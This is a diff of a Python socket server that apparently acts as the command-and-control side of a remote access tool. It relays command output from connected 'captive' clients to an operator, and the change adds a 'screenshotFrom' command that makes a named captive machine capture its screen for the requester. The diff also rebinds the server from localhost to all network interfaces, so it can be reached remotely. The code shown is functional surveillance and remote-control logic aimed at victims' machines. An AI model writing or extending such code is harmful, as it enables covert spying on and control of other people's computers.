@@ -4,7 +4,7 @@ import os
 
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.bind(("localhost", 5000))
+s.bind(("0.0.0.0", 5000))
 
 clients = {}
 
@@ -33,7 +33,7 @@ def receive_file(client, first_data, filename, file_size):
 
     with open(filename, "wb") as f:
         file_data = first_data[:file_size]
-
+        # print("FILE_SIZE", file_size)
         f.write(file_data)
         received += len(file_data)
 
@@ -69,6 +69,7 @@ def client_listener(client, username):
         try:
 
             data = client.recv(1024)
+            # print("DATA: ", data)
             buffer = data
             if not data:
                 print("Client disconnected")
@@ -131,16 +132,41 @@ def client_listener(client, username):
             datavalue = data.split("> ")[1]
             #print (f"Received from {username}: {datavalue}")
 
+
+            if datavalue.startswith("screenshotFrom"):
+                try:
+                    captiveName = datavalue.split()[1]
+                    # print("CAPTIVENAME:", captiveName)
+
+                    captive = clients.get(captiveName)
+
+                    if captive is None:
+                        client.sendall(
+                            "No Captive Found\n".encode("UTF-8")
+                        )
+                        continue
+
+                    captive.sendall(
+                        f"-screenshot {username}\n".encode("UTF-8")
+                    )
+
+                    continue
+
+                except Exception as e:
+                    print(f"Screenshot error: {type(e).__name__}: {e}")
+                    continue
+
+
             if datavalue.startswith("CMD_OUTPUT"):
 
                 data = receive_cmd_output(client, data)
                 parts = data.split(" ", 2)
                 priority = parts[2].split(" ")[0]
-                print(priority)
+                # print(priority)
                 output = " ".join(data.split(" ")[5:])
 
                 prioritySocket = clients.get(priority)
-                print(prioritySocket)
+                # print(prioritySocket)
 
                 if prioritySocket:
                     try:
